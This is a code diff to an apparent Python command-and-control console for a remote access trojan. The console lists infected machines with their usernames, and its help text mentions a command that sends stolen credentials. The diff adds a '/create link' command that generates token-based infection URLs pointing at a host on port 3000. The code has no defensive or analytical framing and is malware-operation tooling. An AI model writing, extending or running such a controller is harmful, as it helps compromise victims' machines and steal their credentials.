@@ -8,7 +8,8 @@ import apext_db
 print('example CC interface')
 print(''' please type in a command
 /list
-/use''')
+/use
+/create link''')
 
 while 1:
     try:
@@ -17,12 +18,13 @@ while 1:
             RATLIST = []
             for rat in apext_db.get_rat_list():
                 RATLIST.append(rat)
-            i2 = 0
+                print(rat)
+            i2 = 1
             i = 0
             for rat in RATLIST:
-                if i2 == 1:
-                    i2 =0
-                    print("{0}) {1} ------ username: {2}".format(i-1, RATLIST[i-1], rat))
+                if i2 == 0:
+                    i2 = 0
+                    print("({0}) {1} ------ username: {2}".format(i-1, RATLIST[i-1], rat))
                 else:
                     i2 +=1
                 i+=1
@@ -64,5 +66,13 @@ while 1:
 /reboot    #attempts to send all creds if havent already
 /script
 /help''')
+
+    if MAIN_INPUT.lower() == '/create link':
+        n = os.urandom(8).hex()
+        f = open('tokens', 'a')
+        f.write('{0}\n'.format(n))
+        f.close()
+        print("Dynamic Token Link created : " + "http://192.168.1.6:3000/inf/{0}".format(n))
+
                     
         
